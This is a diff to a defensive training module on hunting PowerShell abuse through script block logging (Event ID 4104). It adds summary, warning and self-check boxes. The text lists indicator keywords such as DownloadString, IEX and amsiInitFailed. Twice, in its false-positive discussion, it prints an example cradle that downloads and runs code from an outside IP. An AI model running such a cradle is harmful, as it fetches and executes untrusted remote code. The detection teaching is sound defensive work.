@@ -9,6 +9,14 @@
 **Difficulty:** Intermediate &nbsp;·&nbsp; **Estimated time:** ~5–7 hrs (study + lab) &nbsp;·&nbsp; **Prerequisites:** [Foundations](../../../00-foundations/README.md)
 { .module-meta }
 
+!!! abstract "In 60 seconds"
+    PowerShell is the attacker's favourite Windows execution vector and one of the most *catchable* —
+    but only if you enabled the right logging first. Of its three channels, **Script Block Logging
+    (Event ID 4104)** is the crown jewel: it records the *deobfuscated* command after Base64
+    decoding and string rebuilding, defeating obfuscation. None of it is on by default at the level
+    you need, and you can't log retroactively. Once the data exists, the real skill is
+    false-positive discrimination — admins download files and run encoded commands too.
+
 ## Why this matters
 PowerShell is the attacker's favourite Windows execution vector (Module 15 is the offensive side), and
 it is also one of the most *catchable* — but only if you enabled the right logging before the incident.
@@ -27,9 +35,14 @@ PowerShell has three logging channels and they are not interchangeable. **Module
 4104)** is the one that matters most: it records the *text of the script block as PowerShell compiled it
 to run* — which means it captures the **deobfuscated** command, after Base64 decoding and string
 rebuilding, regardless of how the attacker dressed it up. **Transcription** writes a console-style
-input/output record to disk for the human-readable story. The practitioner's mental model: 4103 tells you
-*what cmdlets ran*, 4104 tells you *what code actually executed*, transcription tells you *what the
-session looked like*. For hunting fileless PowerShell, 4104 is the crown jewel.
+input/output record to disk for the human-readable story.
+
+!!! note "The mental model"
+    4103 tells you *what cmdlets ran*, 4104 tells you *what code actually executed*, transcription
+    tells you *what the session looked like*. For hunting fileless PowerShell, **4104 is the crown
+    jewel** — it records the script block as PowerShell compiled it to run, i.e. the *deobfuscated*
+    command after Base64 decoding and string rebuilding, regardless of how the attacker dressed it
+    up.
 
 The catch that blinds most teams: **none of this is on by default at the level you need.** Script Block
 Logging has to be enabled by GPO or registry (`...\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging`),
@@ -41,17 +54,26 @@ lands, and watching for attempts to evade it *is* the job before any hunting sta
 Once the data exists, hunting it is pattern recognition over the `ScriptBlockText` field. A short
 vocabulary of high-signal indicators covers most abuse: remote fetch (`DownloadString`/`DownloadFile`),
 in-memory execution (`IEX`/`Invoke-Expression`), embedded payloads (`FromBase64String`), AMSI tampering
-(`amsiInitFailed`), and obfuscation tells (long `[char]`-code chains). The judgement — and the thing that
-separates a hunt from an alert cannon — is the **false positive**: administrators download files and run
-encoded commands too. A patch script pulling an MSI from an *internal* host and saving it to disk is not
-the same as `IEX (DownloadString('http://1.2.3.4/a'))`, even though both "download." Context — internal vs.
-external, save-to-disk vs. execute-in-memory, who and where — is what you own. A rule that flags every
-download is worse than no rule.
+(`amsiInitFailed`), and obfuscation tells (long `[char]`-code chains).
 
-This module deliberately works the same artifact the offensive side produces: the script blocks you hunt
-here are exactly the cradles, encodings, and obfuscation from Module 15. Hunt them by hand first to learn
-the fields, then graduate to running Sigma rules at scale with a tool like Chainsaw — which is how
-Module 08's detection-as-code reaches production.
+!!! warning "The gotcha"
+    The thing that separates a hunt from an alert cannon is the **false positive**: administrators
+    download files and run encoded commands too. A patch script pulling an MSI from an *internal*
+    host and saving it to disk is not the same as `IEX (DownloadString('http://1.2.3.4/a'))`, even
+    though both "download." Context — internal vs. external, save-to-disk vs. execute-in-memory, who
+    and where — is what you own. A rule that flags every download is worse than no rule.
+
+??? note "Go deeper: this is the same artifact the offense produces"
+    This module deliberately works the same artifact the offensive side produces: the script blocks
+    you hunt here are exactly the cradles, encodings, and obfuscation from Module 15. Hunt them by
+    hand first to learn the fields, then graduate to running Sigma rules at scale with a tool like
+    Chainsaw — which is how Module 08's detection-as-code reaches production.
+
+!!! tip "AI caveat"
+    A model triages 4104 noise fast and can draft a Sigma rule from your indicator list — but a
+    model that flags every `DownloadString` has just built you an alert cannon. Run it against the
+    real sample and confirm it fires on the malicious blocks and **not** on the benign admin
+    download. AI proposes; you tune and own the rule.
 
 ## Learn (~4 hrs)
 
@@ -88,3 +110,11 @@ A model triages 4104 noise fast — feed it a batch of script blocks and have it
 suspicious ones, or draft the Sigma rule from your indicator list. Then *you* run it against the real
 sample and confirm it fires on the malicious blocks and **not** on the benign admin download — a model
 that flags every `DownloadString` has just built you an alert cannon. AI proposes; you tune and own the rule.
+
+!!! question "Check yourself"
+    - Why does Event ID 4104 defeat an attacker's Base64/string obfuscation when a network IDS or
+      4103 might not?
+    - You're asked to hunt PowerShell abuse on a host where logging was never configured — why is
+      that hunt already lost, and what's the only fix?
+    - What distinguishes a benign admin `DownloadString` from a malicious one, and why does that
+      make false-positive discrimination the real skill?
